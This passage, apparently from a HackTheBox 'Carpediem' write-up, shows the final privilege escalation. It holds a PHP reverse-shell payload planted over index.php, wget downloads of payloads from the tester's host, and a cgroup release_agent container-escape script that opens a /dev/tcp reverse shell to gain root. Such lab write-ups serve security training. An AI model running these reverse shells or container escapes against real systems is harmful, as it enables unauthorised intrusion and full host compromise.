+</span></span><span class="line"><span class="cl">              <span class="o">(</span>f.e. index.php?q<span class="o">=</span>node<span class="p">&amp;</span><span class="nv">foo</span><span class="o">=</span>bar<span class="o">)</span>. Prefix <span class="s1">&#39;http://&#39;</span> is required,
+</span></span><span class="line"><span class="cl">              and the domain must exist in Backdrop<span class="s1">&#39;s sites-directory.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">              If the given path and file exists it will be executed directly,
+</span></span></span><span class="line"><span class="cl"><span class="s1">              i.e. if URI is set to http://default/bar/foo.php
+</span></span></span><span class="line"><span class="cl"><span class="s1">              and bar/foo.php exists, this script will be executed without
+</span></span></span><span class="line"><span class="cl"><span class="s1">              bootstrapping Backdrop. To execute Backdrop&#39;</span>s cron.php, specify
+</span></span><span class="line"><span class="cl">              http://default/core/cron.php as the URI.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">To run this script without --root argument invoke it from the root directory
+</span></span><span class="line"><span class="cl">of your Backdrop installation with
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  ./scripts/<span class="o">{</span><span class="nv">$script</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="se">\n</span>
+</span></span><span class="line"><span class="cl">EOF<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  exit<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// define default settings
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="o">]</span>       <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="o">]</span>        <span class="o">=</span> <span class="s1">&#39;/index.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="o">]</span>     <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="o">]</span>  <span class="o">=</span> <span class="s1">&#39;GET&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="o">]</span>    <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="o">]</span>        <span class="o">=</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;console&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// toggle verbose mode
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="s1">&#39;--verbose&#39;</span>, <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$_verbose_mode</span> <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$_verbose_mode</span> <span class="o">=</span> false<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// parse invocation arguments
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">(</span><span class="nv">$param</span> <span class="o">=</span> array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  switch <span class="o">(</span><span class="nv">$param</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;--root&#39;</span>:
+</span></span><span class="line"><span class="cl">      // change working directory
+</span></span><span class="line"><span class="cl">      <span class="nv">$path</span> <span class="o">=</span> array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="o">(</span>is_dir<span class="o">(</span><span class="nv">$path</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        chdir<span class="o">(</span><span class="nv">$path</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="nv">$_verbose_mode</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">echo</span> <span class="s2">&#34;cwd changed to: {</span><span class="nv">$path</span><span class="s2">}\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;\nERROR: {</span><span class="nv">$path</span><span class="s2">} not found.\n\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    default:
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="o">(</span>substr<span class="o">(</span><span class="nv">$param</span>, 0, 2<span class="o">)</span> <span class="o">==</span> <span class="s1">&#39;--&#39;</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        // ignore unknown options
+</span></span><span class="line"><span class="cl">        break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        // parse the URI
+</span></span><span class="line"><span class="cl">        <span class="nv">$path</span> <span class="o">=</span> parse_url<span class="o">(</span><span class="nv">$param</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // <span class="nb">set</span> site name
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;host&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;host&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // <span class="nb">set</span> query string
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;query&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;query&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          parse_str<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;query&#39;</span><span class="o">]</span>, <span class="nv">$_GET</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // <span class="nb">set</span> file to execute or Backdrop path <span class="o">(</span>clean URLs enabled<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> file_exists<span class="o">(</span>substr<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">]</span>, 1<span class="o">)))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$cmd</span> <span class="o">=</span> substr<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">]</span>, 1<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        elseif <span class="o">(</span>isset<span class="o">(</span><span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;q&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;q&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;q&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">[</span><span class="s1">&#39;path&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // display setup in verbose mode
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="nv">$_verbose_mode</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">echo</span> <span class="s2">&#34;Hostname set to: {</span><span class="nv">$_SERVER</span><span class="s2">[&#39;HTTP_HOST&#39;]}\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">echo</span> <span class="s2">&#34;Script name set to: {</span><span class="nv">$cmd</span><span class="s2">}\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">echo</span> <span class="s2">&#34;Path set to: {</span><span class="nv">$_GET</span><span class="s2">[&#39;q&#39;]}\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$cmd</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  include <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;\nERROR: {</span><span class="nv">$cmd</span><span class="s2">} not found.\n\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">exit<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">www-data@90c7f522b842:/var/www/html/backdrop$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It&rsquo;s a php file which runs with argument <code>--root</code> which sets the working directory for the script to the specified path which in our case is <code>/var/www/html/backdrop</code> and then finally calls the site at <code>https://localhost</code> to check if the site is alive or not.</p>
+<p>How we can use this as our advantage is, we can replace the <code>/var/www/html/backdrop/index.php</code> file with our crafted malicious <code>php</code> file and everytime this heartbeat check is called, our malicious script will be executed instead.</p>
+<p>Now create a crafted index.php file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat index.php                                                 
+</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/1234 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start a <code>nc</code> listener at <code>1234</code>, delete the old <code>index.php</code> file and replace it with our own.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@90c7f522b842:/var/www/html/backdrop$ rm -f index.php <span class="o">&amp;&amp;</span> wget http://10.10.14.46/index.php
+</span></span><span class="line"><span class="cl">&lt;m -f index.php <span class="o">&amp;&amp;</span> wget http://10.10.14.46/index.php
+</span></span><span class="line"><span class="cl">--2022-11-02 06:56:13--  http://10.10.14.46/index.php
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.46:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">71</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: <span class="s1">&#39;index.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     0K                                                       100%  <span class="nv">100K</span><span class="o">=</span>0.001s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2022-11-02 06:56:13 <span class="o">(</span><span class="m">100</span> KB/s<span class="o">)</span> - <span class="s1">&#39;index.php&#39;</span> saved <span class="o">[</span>71/71<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@90c7f522b842:/var/www/html/backdrop$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-carpediem/41.png" title="shell as root in docker container" data-thumbnail="/hackthebox-carpediem/41.png" data-sub-html="<h2>shell as root in docker container</h2><p>shell as root in docker container</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/41.png"
+            data-srcset="/hackthebox-carpediem/41.png, /hackthebox-carpediem/41.png 1.5x, /hackthebox-carpediem/41.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/41.png" width="1920" height="150" />
+    </a><figcaption class="image-caption">shell as root in docker container</figcaption>
+    </figure></p>
+<h3 id="escaping-the-privileged-docker-container">Escaping the privileged docker container</h3>
+<p>Now for getting <code>root</code> on the main machine and escaping the docker we can read <a href="https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1" target="_blank" rel="noopener noreffer ">this</a> article.</p>
+<p>Following the article, I made the following script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /tmp/privesc
+</span></span><span class="line"><span class="cl">mount -t cgroup -o rdma cgroup /tmp/privesc
+</span></span><span class="line"><span class="cl">mkdir /tmp/privesc/x
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /tmp/privesc/x/notify_on_release
+</span></span><span class="line"><span class="cl"><span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span>sed -n <span class="s1">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$host_path</span><span class="s2">/cmd&#34;</span> &gt; /tmp/privesc/release_agent
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> &gt; /cmd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/9001 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; /cmd
+</span></span><span class="line"><span class="cl">chmod a+x /cmd
+</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;echo \$\$ &gt; /tmp/privesc/x/cgroup.procs&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now again start a <code>nc</code> listener on port <code>9001</code> and execute the script.</p>
+<p>But before executing the script,</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>unshare()<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Mounting a cgroupfs requires the CAP_SYS_ADMIN capability in the user namespace hosting the current cgroup namespace. By default, containers run without CAP_SYS_ADMIM, and thus cannot mount cgroupfs in the initial user namespace. But through the unshare() syscall, containers can create new user and cgroup namespaces where they possess the CAP_SYS_ADMIN capability and can mount a cgroupfs.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/" target="_blank" rel="noopener noreffer ">https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@90c7f522b842:~# unshare -UrmC bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@90c7f522b842:~# wget http://10.10.14.46/script.sh &amp;&gt;/dev/null &amp;&amp; chmod +x script.sh &amp;&amp; ./script.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And finally we got <code>root</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -lvnp <span class="m">9001</span>          
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.167<span class="o">]</span> <span class="m">35810</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@carpediem:/# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="roottxt">root.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@carpediem:/# ls -al
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">72</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">19</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">19</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root     <span class="m">7</span> Aug <span class="m">24</span>  <span class="m">2021</span> bin -&gt; usr/bin
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Jun <span class="m">20</span> 12:05 boot
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Oct <span class="m">26</span>  <span class="m">2021</span> cdrom
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">19</span> root root  <span class="m">3940</span> Nov  <span class="m">2</span> 05:23 dev
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">110</span> root root  <span class="m">4096</span> Jun <span class="m">23</span> 15:55 etc
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">6</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 home
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root     <span class="m">7</span> Aug <span class="m">24</span>  <span class="m">2021</span> lib -&gt; usr/lib
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root     <span class="m">9</span> Aug <span class="m">24</span>  <span class="m">2021</span> lib32 -&gt; usr/lib32
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root     <span class="m">9</span> Aug <span class="m">24</span>  <span class="m">2021</span> lib64 -&gt; usr/lib64
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">10</span> Aug <span class="m">24</span>  <span class="m">2021</span> libx32 -&gt; usr/libx32
+</span></span><span class="line"><span class="cl">drwx------   <span class="m">2</span> root root <span class="m">16384</span> Oct <span class="m">26</span>  <span class="m">2021</span> lost+found
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Aug <span class="m">24</span>  <span class="m">2021</span> media
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 mnt
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 opt
+</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">338</span> root root     <span class="m">0</span> Nov  <span class="m">2</span> 05:23 proc
+</span></span><span class="line"><span class="cl">drwx------   <span class="m">6</span> root root  <span class="m">4096</span> Jun <span class="m">23</span> 15:54 root
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">27</span> root root   <span class="m">880</span> Nov  <span class="m">2</span> 11:48 run
+</span></span><span class="line"><span class="cl">lrwxrwxrwx   <span class="m">1</span> root root     <span class="m">8</span> Aug <span class="m">24</span>  <span class="m">2021</span> sbin -&gt; usr/sbin
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 srv
+</span></span><span class="line"><span class="cl">dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Nov  <span class="m">2</span> 05:23 sys
+</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">12</span> root root  <span class="m">4096</span> Nov  <span class="m">2</span> 13:35 tmp
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">14</span> root root  <span class="m">4096</span> May <span class="m">26</span> 13:51 usr
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">13</span> root root  <span class="m">4096</span> May <span class="m">26</span> 14:34 var
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@carpediem:/# cat /root/root.txt
+</span></span><span class="line"><span class="cl">cat /root/root.txt
+</span></span><span class="line"><span class="cl">8c****************************c6
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@carpediem:/#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-12-03</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-carpediem/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-carpediem/" data-title="HackTheBox - Carpediem" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-carpediem/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-carpediem/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-shared/" class="prev" rel="prev" title="Hackthebox - Shared"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hackthebox - Shared</a>
+            <a href="/cryptohack-challenges-general-encoding/" class="next" rel="next" title="CryptoHack - Challenges - General/Encoding">CryptoHack - Challenges - General/Encoding<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
